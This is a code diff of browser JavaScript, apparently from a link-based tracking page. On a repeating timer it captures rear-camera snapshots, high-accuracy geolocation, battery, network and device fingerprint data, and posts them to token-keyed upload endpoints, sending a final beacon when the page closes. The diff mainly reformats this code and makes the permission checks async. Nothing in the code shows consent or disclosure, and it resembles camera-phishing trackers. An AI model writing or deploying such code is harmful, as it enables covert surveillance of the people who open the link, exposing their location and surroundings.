@@ -11,7 +11,7 @@
 
   const json = (o) => JSON.stringify(o);
 
-  function getDetails() {
+  async function getDetails() {
     const d = {};
     d.userAgent = navigator.userAgent || "";
     d.platform = navigator.platform || "";
@@ -21,32 +21,40 @@
     d.screen = {
       w: window.screen.width,
       h: window.screen.height,
-      ratio: window.devicePixelRatio || 1
+      ratio: window.devicePixelRatio || 1,
     };
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+    const conn =
+      navigator.connection ||
+      navigator.mozConnection ||
+      navigator.webkitConnection;
     if (conn) {
       d.network = {
         type: conn.effectiveType,
         downlink: conn.downlink,
         rtt: conn.rtt,
-        saveData: conn.saveData
+        saveData: conn.saveData,
       };
     }
+
     d.permissions = {};
     if (navigator.permissions) {
-      ["camera", "geolocation"].forEach((name) => {
+      for (const name of ["camera", "geolocation"]) {
         try {
-          navigator.permissions
-            .query({ name })
-            .then((r) => { d.permissions[name] = r.state; })
-            .catch(() => {});
-        } catch {}
-      });
+          const r = await navigator.permissions.query({ name });
+          d.permissions[name] = r.state;
+        } catch (e) {
+          // ignore
+        }
+      }
     }
+
     try {
       const opt = Intl.DateTimeFormat().resolvedOptions();
       d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
-    } catch {}
+    } catch {
+      // ignore
+    }
     return d;
   }
 
@@ -64,11 +72,12 @@
     return new Promise((resolve) => {
       if (!navigator.geolocation) return resolve(null);
       navigator.geolocation.getCurrentPosition(
-        (pos) => resolve({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy
-        }),
+        (pos) =>
+          resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+          }),
         () => resolve(null),
         { enableHighAccuracy: true, timeout: 4000 }
       );
@@ -108,7 +117,7 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: json(body),
-        keepalive: true
+        keepalive: true,
       });
     } catch {
       // ignore
@@ -127,21 +136,21 @@
     await post(`/upload_image/${token}`, {
       image_b64: dataUrl,
       battery,
-      coords
+      coords,
     });
   }
 
   async function tick() {
-    const [battery, coords] = await Promise.all([
+    const [battery, coords, details] = await Promise.all([
       getBattery(),
-      getCoords()
+      getCoords(),
+      getDetails(),
     ]);
-    const details = getDetails();
 
     await post(`/upload_info/${token}`, {
       battery,
       coords,
-      details
+      details,
     });
 
     await captureAndUpload(battery, coords);
@@ -151,7 +160,7 @@
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "environment" },
-        audio: false
+        audio: false,
       });
     } catch {
       // no camera, still send info
@@ -162,9 +171,13 @@
     video.srcObject = stream;
     try {
       await video.play();
-    } catch {}
+    } catch {
+      // ignore
+    }
 
     await waitForVideoReady(4000);
+    // give the first real frame a moment to render
+    await new Promise((r) => setTimeout(r, 300));
 
     await tick(); // first tick immediately
     loopTimer = setInterval(tick, CAPTURE_MS);
@@ -176,7 +189,9 @@
     if (stream) {
       try {
         stream.getTracks().forEach((t) => t.stop());
-      } catch {}
+      } catch {
+        // ignore
+      }
       stream = null;
       video.srcObject = null;
     }
@@ -186,9 +201,13 @@
     try {
       navigator.sendBeacon(
         `/upload_info/${token}`,
-        new Blob([json({ note: "page-closed" })], { type: "application/json" })
+        new Blob([json({ note: "page-closed" })], {
+          type: "application/json",
+        })
       );
-    } catch {}
+    } catch {
+      // ignore
+    }
     stop();
   });
 
